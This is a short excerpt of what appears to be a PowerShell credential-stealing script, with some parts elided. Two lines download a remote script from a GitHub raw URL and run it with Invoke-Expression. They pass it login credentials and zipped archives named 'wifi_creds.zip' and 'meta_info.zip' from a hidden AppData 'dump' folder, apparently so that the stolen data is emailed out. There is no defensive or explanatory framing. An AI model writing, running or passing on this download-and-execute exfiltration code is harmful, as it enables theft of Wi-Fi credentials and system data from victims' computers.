...
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $Username $Password $env:appdata\Microsoft\dump\wifi_creds.zip"
...
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $Username $Password $env:appdata\Microsoft\dump\meta_info.zip"
